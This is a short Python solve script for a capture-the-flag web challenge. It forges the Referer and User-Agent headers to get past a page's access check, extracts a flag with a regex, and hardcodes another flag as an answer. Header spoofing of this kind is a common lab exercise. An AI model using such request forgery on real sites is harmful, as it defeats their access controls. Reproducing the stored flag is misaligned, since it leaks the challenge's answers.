import re

import requests
from constants import FLAG_REGEX, TIMEOUT, URL
from flag_01 import FLAG01


URL = f"{URL}/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"
REFERER = "https://www.nsa.gov/"
USER_AGENT = FLAG01[:12].lower()

FLAG03 = "7e6409f438927e6a5467c929f5207abb"


def main() -> None:
    response = requests.get(
        URL,
        headers={"Referer": REFERER, "User-Agent": USER_AGENT},
        timeout=TIMEOUT,
    )

    if (match := re.search(FLAG_REGEX, response.text)) is None:
        raise ValueError()

    flag = match.group(1)
    print(flag)


if __name__ == "__main__":
    main()
